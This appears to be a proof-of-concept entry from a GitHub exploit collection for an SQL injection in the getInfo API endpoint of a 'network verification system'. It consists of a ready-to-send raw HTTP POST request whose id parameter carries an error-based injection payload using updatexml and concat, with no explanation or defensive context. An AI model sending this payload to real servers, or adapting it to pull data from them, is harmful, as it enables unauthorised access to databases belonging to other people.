# wlyz_getinfo_sqli
2024.4.1 @2 
from:  https://github.com/wy876/POC/blob/main/%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%B3%BB%E7%BB%9FgetInfo%E5%8F%82%E6%95%B0%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
```
POST /index.php/api/Software/getInfo HTTP/1.1
Host: 
Content-Length: 0
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

data=123456&id=1 and updatexml(1,concat(0x7e,md5(123),0x7e),1)
```
